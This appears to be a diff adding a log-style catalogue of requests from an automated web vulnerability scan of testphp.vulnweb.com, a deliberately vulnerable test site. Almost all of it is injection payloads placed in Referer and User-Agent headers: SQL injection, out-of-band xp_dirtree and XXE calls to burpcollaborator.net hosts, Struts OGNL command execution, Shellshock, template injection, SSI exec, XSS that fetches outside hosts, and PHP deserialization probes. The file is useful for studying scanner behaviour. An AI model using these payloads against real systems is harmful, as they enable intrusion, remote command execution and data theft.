@@ -1,0 +1,1140 @@
+
+
+URL :  http://testphp.vulnweb.com/search.php?test=query 
+
+Directory/File Searching:
+    /check_network_status.txt 
+    /clientaccesspolicy.xml 
+    /crossdomain.xml  
+    /robots.txt 
+    /trace.axd 
+
+Headers:
+    2Bh25HX2: 2Bh25HX2
+    3MGOC1BT: 3MGOC1BT
+    3vKAnnsk: 3vKAnnsk
+    9S: H"
+    Accept: */*
+    Accept: ../../../../../../../../../../../../../e*c/h*s*s{{
+    Accept-Encoding: gzip, deflate
+    Accept: image/webp,*/*
+    Accept-Language: en
+    Accept-Language: en-US,en;q=0.5
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    awt: p
+    bes: x
+    Cache-Control: max-age=0
+    Cache-Control: no-cache, no-transform
+    Connection: close
+    Connection: keep-alive
+    Content-Length: 10
+    Content-Length: 102
+    Content-Length: 110
+    Content-Length: 112
+    Content-Length: 114
+    Content-Length: 115
+    Content-Length: 116
+    Content-Length: 119
+    Content-Length: 121
+    Content-Length: 123
+    Content-Length: 124
+    Content-Length: 126
+    Content-Length: 127
+    Content-Length: 128
+    Content-Length: 130
+    Content-Length: 132
+    Content-Length: 133
+    Content-Length: 135
+    Content-Length: 137
+    Content-Length: 141
+    Content-Length: 142
+    Content-Length: 151
+    Content-Length: 1675
+    Content-Length: 175
+    Content-Length: 182
+    Content-Length: 191
+    Content-Length: 193
+    Content-Length: 194
+    Content-Length: 195
+    Content-Length: 197
+    Content-Length: 198
+    Content-Length: 199
+    Content-Length: 212
+    Content-Length: 219
+    Content-Length: 221
+    Content-Length: 24
+    Content-Length: 25
+    Content-Length: 27
+    Content-Length: 273
+    Content-Length: 278
+    Content-Length: 28
+    Content-Length: 29
+    Content-Length: 292
+    Content-Length: 30
+    Content-Length: 31
+    Content-Length: 311
+    Content-Length: 316
+    Content-Length: 32
+    Content-Length: 327
+    Content-Length: 33
+    Content-Length: 331
+    Content-Length: 34
+    Content-Length: 35
+    Content-Length: 360
+    Content-Length: 365
+    Content-Length: 37
+    Content-Length: 40
+    Content-Length: 41
+    Content-Length: 43
+    Content-Length: 44
+    Content-Length: 46
+    Content-Length: 47
+    Content-Length: 48
+    Content-Length: 49
+    Content-Length: 50
+    Content-Length: 51
+    Content-Length: 52
+    Content-Length: 53
+    Content-Length: 54
+    Content-Length: 55
+    Content-Length: 56
+    Content-Length: 57
+    Content-Length: 58
+    Content-Length: 59
+    Content-Length: 60
+    Content-Length: 61
+    Content-Length: 62
+    Content-Length: 64
+    Content-Length: 65
+    Content-Length: 66
+    Content-Length: 67
+    Content-Length: 68
+    Content-Length: 69
+    Content-Length: 72
+    Content-Length: 75
+    Content-Length: 81
+    Content-Type: ${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("X-Ack",9968*8375)}.multipart/form-data
+    Content-Type: application/xml
+    Content-Type: application/x-www-form-urlencoded
+    Content-Type: text/xml
+    Cookie: g4whg395b3
+    Cookie: rl192l6i4m
+    DNT: 1
+    fwd: o
+    Host: 299p6azufec8qhnhwe2jgk5tokudi36v8jy6oud.burpcollaborator.net
+    Host: 2psroq87jm8k9by5nkruqw18izosci0a2ysli97.burpcollaborator.net
+    Host: testphp.vulnweb.com
+    Host: testphp.vulnweb.com:80@6pwtmefyvisc6l3lciinwolx4oahy7m0co2bszh.burpcollaborator.net
+    Host: testphp.vulnweb.com:80@efx1cm56lqikwttt2q8vmwb5uw0pofc82wsji77.burpcollaborator.net
+    iw4zIUbq: iw4zIUbq
+    JqsiAAhV: JqsiAAhV
+    msd: j
+    ncx: m
+    Origin: http://testphp.vulnweb.com
+    Origin: null
+    Pragma: no-cache
+    Referer: 
+    Referer: () { _; } >_[$($())] { /bin/sleep 11; }
+    Referer: ${4645*5959}
+    Referer: $(sleep 11)
+    Referer: 0stnp8isycv69f6ffclhzior7idb11pthhc43ss
+    Referer: 2613*3975
+    Referer: @(5897*2449)
+    Referer: %{9737*6406}
+    Referer: a'a\'b"c>?>%}}%%>c<[[?${{%}}cake\
+    Referer: () { :;}; /bin/sleep 0
+    Referer: () { :;}; /bin/sleep 11
+    Referer: blep08ww6x
+    Referer: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ping 4fkkk3avacn9c0s7jhlx6u7ic9iz6o.burpcollaborator.net -c1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+    Referer: dmta1{{167*890}}e90q3
+    Referer: eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
+    Referer: ez8wu${115*662}giw4k
+    Referer: http://2svppaiuyev89h6hfeljzkot7kdd13ptdo0fo4.burpcollaborator.net/
+    Referer: http://8dmxcwwd7swqxhmbbqf0e2pe65cy0oohccz3ns.burpcollaborator.net/
+    Referer: http://azy2gnbfgp.com/
+    Referer: Http://dn40kld5tpqj4s1sapguuvj42v8owek7mvhi86x.burpcollaborator.net/
+    Referer: Http://jm98l75og3516svmk1obndypfgl99zxszgu3lra.burpcollaborator.net/
+    Referer: http://lGlYKgGNczcdMhx.com/
+    Referer: https://3swsrrb8mnblcc16qluvtx49l0rtfj3ar5ew2l.burpcollaborator.net/
+    Referer: https://dj00gl95ppmj0sxs6pcuqvf4yv4oseg742rtfi.burpcollaborator.net/
+    Referer: https://example.com/
+    Referer: https://example.com/"
+    Referer: https://example.com/'
+    Referer: https://example.com/>
+    Referer: https://example.com/{${sleep(20)}}
+    Referer: https://example.com/$zq=%3c%61%60%27%22%24%7b%7b%5c&zq%3d
+    Referer: https://example.com/',0)waitfor delay'0:0:20'--
+    Referer: https://example.com/37994821' or '2041'='2041
+    Referer: https://example.com/63225243' or 1724=1730-- 
+    Referer: https://example.com/68785602' or '5753'='5755
+    Referer: https://example.com/92952773' or 3438=3438-- 
+    Referer: https://example.com/' and 1020=1020-- 
+    Referer: https://example.com/' and '1032'='1032
+    Referer: https://example.com/' and 1735=1744-- 
+    Referer: https://example.com/' and '9313'='9316
+    Referer: https://example.com/' and (select*from(select(sleep(20)))a)-- 
+    Referer: https://example.com/;declare @q varchar(99);set @q='\\69dt6ezyficcqlnlwi2ngo5xoouhi76ywmr9ix7.burpcollab'+'orator.net\dks'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: https://example.com/);declare @q varchar(99);set @q='\\iug5rqka0uxobx8xhunz10q990ft3jrajyel59u.burpcollab'+'orator.net\zse'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: https://example.com/');declare @q varchar(99);set @q='\\nb2a8v1fhzets2p2yz44i57eq5wyko8f13wqnec.burpcollab'+'orator.net\qud'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: https://example.com/';declare @q varchar(99);set @q='\\sqmfn0gkw4ty7747d4j9xamj5ab3ztnke89v0jp.burpcollab'+'orator.net\qhx'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: https://example.com/'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'
+    Referer: https://example.com/'+(function(){if(typeof g3m6r==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);g3m6r=1;}}())+'
+    Referer: https://example.com/hhfj3%>wuww3'/"<a34kh
+    Referer: https://example.com/}}jegy1'/"<za5bu
+    Referer: https://example.com/qpa341bn5y
+    Referer: https://example.com/'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ekspk SYSTEM "http://cfvzck54loiiwrtr2o8tmub3uu0nodch0cn3bs.burpcollab'||'orator.net/">%ekspk;]>'),'/l') from dual)||'
+    Referer: https://example.com/'(select*from(select(sleep(20)))a)'
+    Referer: https://example.com/'+(select*from(select(sleep(20)))a)+'
+    Referer: https://example.com/,(select*from(select(sleep(20)))a)
+    Referer: https://example.com/'+(select load_file('\\\\8t2vqgj0zkwean7ngkmp0qpz8qej29q0toobfz4.burpcollaborator.net\\caf'))+'
+    Referer: https://example.com/'.sleep(20).'
+    Referer: https://example.com/'+sleep(20.to_i)+'
+    Referer: https://example.com/%}vklp9'/"<k5eek
+    Referer: https://example.com/' waitfor delay'0:0:20'--
+    Referer: https://example.com/')waitfor delay'0:0:20'--
+    Referer: http://testphp.vulnweb.com/
+    Referer: http://testphp.vulnweb.com/"
+    Referer: http://testphp.vulnweb.com/'
+    Referer: http://testphp.vulnweb.com/>
+    Referer: http://testphp.vulnweb.com/{${sleep(20)}}
+    Referer: http://testphp.vulnweb.com/',0)waitfor delay'0:0:20'--
+    Referer: http://testphp.vulnweb.com/17154749' or '2559'='2565
+    Referer: http://testphp.vulnweb.com/5ppvkq8ne0
+    Referer: http://testphp.vulnweb.com/77593552' or 5462=5462-- 
+    Referer: http://testphp.vulnweb.com/88877230' or 6353=6357-- 
+    Referer: http://testphp.vulnweb.com/88997777' or '5785'='5785
+    Referer: http://testphp.vulnweb.com/' and 5865=5865-- 
+    Referer: http://testphp.vulnweb.com/' and '6749'='6749
+    Referer: http://testphp.vulnweb.com/' and '8212'='8215
+    Referer: http://testphp.vulnweb.com/' and 9348=9349-- 
+    Referer: http://testphp.vulnweb.com/' and (select*from(select(sleep(20)))a)-- 
+    Referer: http://testphp.vulnweb.com/;declare @q varchar(99);set @q='\\c7k160qh1wqurlgf5u9486ji0962usij873uuij.burpcollab'+'orator.net\vci'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: http://testphp.vulnweb.com/';declare @q varchar(99);set @q='\\gcw5b4vl60vywpljaye8daom5db6zwnneb9y0mp.burpcollab'+'orator.net\cvo'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: http://testphp.vulnweb.com/');declare @q varchar(99);set @q='\\o4td3cnty8n6oxdr266g5iguxl3er4fv8j36uuj.burpcollab'+'orator.net\vwz'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: http://testphp.vulnweb.com/);declare @q varchar(99);set @q='\\pohend7ui9778yxsm7qhpj0vhmnfb5zwrkm7dv2.burpcollab'+'orator.net\vuk'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: http://testphp.vulnweb.com/'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'
+    Referer: http://testphp.vulnweb.com/'+(function(){if(typeof ndsa5==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);ndsa5=1;}}())+'
+    Referer: http://testphp.vulnweb.com/}}jjw94'/"<bgj8s
+    Referer: http://testphp.vulnweb.com/listproducts.php?cat=1
+    Referer: http://testphp.vulnweb.com/%}n6k1q'/"<v39jk
+    Referer: http://testphp.vulnweb.com/'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % zpani SYSTEM "http://ao2zny7fiu7s8jxdmsq2p40gh7n0bqzunpagy5.burpcollab'||'orator.net/">%zpani;]>'),'/l') from dual)||'
+    Referer: http://testphp.vulnweb.com/'(select*from(select(sleep(20)))a)'
+    Referer: http://testphp.vulnweb.com/'+(select*from(select(sleep(20)))a)+'
+    Referer: http://testphp.vulnweb.com/,(select*from(select(sleep(20)))a)
+    Referer: http://testphp.vulnweb.com/'+(select load_file('\\\\eas392tj4ytwunjh8wc6b8mk3b94xullo9jwakz.burpcollaborator.net\\lwj'))+'
+    Referer: http://testphp.vulnweb.com/'.sleep(20).'
+    Referer: http://testphp.vulnweb.com/'+sleep(20.to_i)+'
+    Referer: http://testphp.vulnweb.com/tl6g5%>g6s10'/"<hm5nq
+    Referer: http://testphp.vulnweb.com/' waitfor delay'0:0:20'--
+    Referer: http://testphp.vulnweb.com/')waitfor delay'0:0:20'--
+    Referer: javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/929wzhs18l5fjogoplvq9ry0hrnkbaz2qqldc11X;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>
+    Referer: javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/i9s786sn32s0tril70baaclo2f88wykqbe61xpmX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>
+    Referer: krh3<!--esi-->ze7l<!--esx-->lpx9
+    Referer: O:3:"PDO":0:{}
+    Referer: otw3c7xmbw3`z'z"${{%{{\
+    Referer: (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ekspk SYSTEM "http://a4fx1iu2am7glpiprmxrbs01jspldb1ep9c00p.burpcollab'||'orator.net/">%ekspk;]>'),'/l') from dual)
+    Referer: (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % zpani SYSTEM "http://3swsrrb8mnblcc16qluvtx49l0rtfj3mrhe82x.burpcollab'||'orator.net/">%zpani;]>'),'/l') from dual)
+    Referer: (select load_file('\\\\9q0wnhg1wltf7o4odljqxrm05rbkzan1ppkcb00.burpcollaborator.net\\fsj'))
+    Referer: (select load_file('\\\\hsd6r5bmm1bzcq1kqzu9tb4nler7fx3o5c0zrng.burpcollaborator.net\\erq'))
+    Referer: "-->'-->`--><!--#set var="dtw" value="csvzpki4yo"--><!--#set var="fvy" value="eux1rmk60q"--><!--#echo var="dtw"--><!--#echo var="fvy"--><!--#exec cmd="nslookup -q=cname zfimc75rlbi5wete2b8gmhbquh0ao0csag53wrl.burpcollaborator.net" -->
+    Referer: "-->'-->`--><!--#set var="fqs" value="epr3o28jjy"--><!--#set var="hsu" value="grt5q4all0"--><!--#echo var="fqs"--><!--#echo var="hsu"--><!--#exec cmd="nslookup -q=cname 1ceqbpv66lvjwal4ajetdvo75ybrzhn9lxgk78w.burpcollaborator.net" -->
+    Referer: `sleep 11`
+    Referer: '"><svg/onload=fetch`//bq5ynjg3wnth7q4qdnjsxtm25tbmzcn4ds8fz3o\.burpcollaborator.net`>
+    Referer: '"><svg/onload=fetch`//ii47h61nc2102rrlg0kajcuobfh85ytqjee15pu\.burpcollaborator.net`>
+    Referer: TzozOiJQRE8iOjA6e30=
+    Referer: v0vl''eogr
+    Referer: v51k4jo0zfodp4ey3d7n6ph1ys4lsbg38r3eu2j
+    Referer: vfxgk{{889*983}}t0xpu
+    Referer: we49a${239*787}fz1sf
+    Referer: {!xmlparser v='<!DOCTYPE a SYSTEM "http://agufyt1mokl2uxe4i8um0vmnze54tt.burpcollaborator.net/xxe"><a></a>'}
+    Referer: y6ax6ymhty
+    tnm: o
+    Transfer-Encoding: 1AycmRx6
+    Transfer-Encoding: BW4S5bC5
+    Transfer-Encoding: chunked
+    Transfer-Encoding: cLPCNAei
+    Transfer-Encoding: rdQnne1q
+    Transfer-Encoding: VrzND3Yk
+    Transfer-Encoding: wROFQDyF
+    User-Agent: () { _; } >_[$($())] { /bin/sleep 11; }
+    User-Agent: ${4325*4225}
+    User-Agent: $(sleep 11)
+    User-Agent: 3c5y<!--esi-->e6v1<!--esx-->6d8b
+    User-Agent: @(6638*9235)
+    User-Agent: 7785*3798
+    User-Agent: %{8656*3193}
+    User-Agent: 8oxxnw7dis7q8hxbmqq0p20eh5nybozgr4mrcf1
+    User-Agent: a'a\'b"c>?>%}}%%>c<[[?${{%}}cake\
+    User-Agent: () { :;}; /bin/sleep 0
+    User-Agent: () { :;}; /bin/sleep 11
+    User-Agent: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ping jre1gro4e7dlg1anwsmc7jg7eyko8d.burpcollaborator.net -c1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+    User-Agent: eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
+    User-Agent: g7ee7{{248*733}}sy2vd
+    User-Agent: http://58bs5dyxehbbpkmkvh1mfn4wnntgh65wtrgh46.burpcollaborator.netMozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+    User-Agent: http://zuxotnd4ojdhe832shwrvt65nwtphf55t0gq4f.burpcollaborator.netMozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
+    User-Agent: i5z7e{{468*850}}kyg54
+    User-Agent: izl7y6int2i0jr8lx01a0cbosfy8myaqyllb90.burpcollaborator.net
+    User-Agent: javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/cdt1c0wh7wwuxlmfbuf4e6pi69c20sokf8av0jpX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>
+    User-Agent: javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/d4i01lu5ap7jlsisrpxubv04jvpode16sunhd52X;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>
+    User-Agent: lnir6gr6y6
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0>
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0{${sleep(20)}}
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0',0)waitfor delay'0:0:20'--
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.019533645' or 7199=7199-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.02hkzpj5i7q
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.046982895' or '5584'='5593
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.062369934' or '4075'='4075
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.083564242' or 5259=5260-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0}}ab9hy'/"<i8eez
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' and '2219'='2220
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' and 3976=3982-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' and 5366=5366-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' and '6641'='6641
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' and (select*from(select(sleep(20)))a)-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0;declare @q varchar(99);set @q='\\2adr9qt74mtkubj58kcubwm83z9sxil9bx6kw8l.burpcollab'+'orator.net\jyq'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0');declare @q varchar(99);set @q='\\do52n17iix7v8mxgmvq5p70jhan3btzks8nvdj2.burpcollab'+'orator.net\lxx'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0);declare @q varchar(99);set @q='\\l1na09kqv5k3luaoz33d2fdrui0bo1cs4gz3pre.burpcollab'+'orator.net\dhf'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0';declare @q varchar(99);set @q='\\vihkhj10cf1d24rygdknjpu1bshl5bt2kqfd51u.burpcollab'+'orator.net\jqa'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'+(function(){if(typeof azljf==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);azljf=1;}}())+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jtagz SYSTEM "http://jg38f7zoa3z10spme1ibhdsp9gf93zr3fy2oqd.burpcollab'||'orator.net/">%jtagz;]>'),'/l') from dual)||'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'(select*from(select(sleep(20)))a)'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'+(select*from(select(sleep(20)))a)+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0,(select*from(select(sleep(20)))a)
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'+(select load_file('\\\\mf5beayr96y4zvopd4heggrs8jec22qttho4es3.burpcollaborator.net\\njz'))+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'.sleep(20).'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'+sleep(20.to_i)+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' waitfor delay'0:0:20'--
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0')waitfor delay'0:0:20'--
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0zjp1d%>izwm2'/"<o0pds
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0%}zw23i'/"<bblvu
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0>
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0{${sleep(20)}}
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0$zq=%3c%61%60%27%22%24%7b%7b%5c&zq%3d
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0',0)waitfor delay'0:0:20'--
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.025377098' or '9066'='9073
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.032199297' or 8785=8789-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.076283760' or '4549'='4549
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.091036056' or 5436=5436-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' and 6715=6715-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' and '8240'='8240
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' and '9247'='9252
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' and 9309=9311-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' and (select*from(select(sleep(20)))a)-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0bf3fi%>rmw3s'/"<osw76
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0}}bq008'/"<fu5qq
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0%}ccl10'/"<zq1bv
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0);declare @q varchar(99);set @q='\\1hjoe97tndk7ygvg4daiojdswj2cq2et6h14rsg.burpcollab'+'orator.net\ekl'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0;declare @q varchar(99);set @q='\\3ptqmbfvvfs96i3icfikwllu4laey4mvcj76xum.burpcollab'+'orator.net\wmw'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0';declare @q varchar(99);set @q='\\qlfdiybir2ow25z582e7s8hh0861urii964tuhj.burpcollab'+'orator.net\fie'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0');declare @q varchar(99);set @q='\\xz0kw5pp5923gcdcm9se6fvoefk88ywppdk0aoz.burpcollab'+'orator.net\nlx'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'+(function(){if(typeof rkqb5==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);rkqb5=1;}}())+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ifeht SYSTEM "http://t71g41xld5azo8l8u50aeb3kmbs4gu4ystfj38.burpcollab'||'orator.net/">%ifeht;]>'),'/l') from dual)||'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'(select*from(select(sleep(20)))a)'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'+(select*from(select(sleep(20)))a)+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0,(select*from(select(sleep(20)))a)
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'+(select load_file('\\\\jcz69r2bivfptyqyzv50j18ar1xulk9bcz7mxam.burpcollaborator.net\\wvv'))+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'.sleep(20).'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'+sleep(20.to_i)+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0t88irftx7q
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' waitfor delay'0:0:20'--
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0')waitfor delay'0:0:20'--
+    User-Agent: nt54m${447*736}gko9a
+    User-Agent: O:3:"PDO":0:{}
+    User-Agent: q1sdyyri724wi5f5o2u788xhg8m1aryjq7lubi0
+    User-Agent: qbxbvmu76`z'z"${{%{{\
